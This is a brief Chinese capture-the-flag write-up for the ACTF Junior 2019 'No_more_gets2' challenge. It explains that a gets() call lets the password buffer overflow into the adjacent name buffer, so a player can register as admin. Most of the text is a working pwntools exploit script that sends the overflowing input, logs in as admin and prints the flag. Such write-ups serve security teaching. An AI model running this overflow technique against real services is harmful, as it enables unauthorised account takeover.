查看[源码](https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c)，问题出在[第140行（rigist()+12）](https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets1/src/src.c#L140)，passwdbuf在namebuf前面，所以gets的时候可以把namebuf覆盖掉，于是就能强行注册一个密码自己设定的admin。

一个可用的exp如下：

```python
from pwn import *
import sys
# context.log_level='debug'

if args['REMOTE']:
    sh = remote(sys.argv[1], sys.argv[2])
else:
    sh = process("./a.out")

payload=0x10 * 'a' + p64(0x0) + p64(0x555555555607)

sh.recvuntil("6) Exit")
sh.sendline("3")
#gdb.attach(sh)
#gdb.attach(sh)
sh.recvuntil("Input your name")
sh.sendline('father')
sh.recvuntil('Input your password')
sh.sendline('aaaaaaaaaaaaaaa\0admin\0')
sh.recvuntil("6) Exit")
sh.sendline('2')
sh.sendline('admin')
sh.sendline('aaaaaaaaaaaaaaa')
sh.sendline('4')
print sh.recvuntil('}')
sh.sendline('6')
```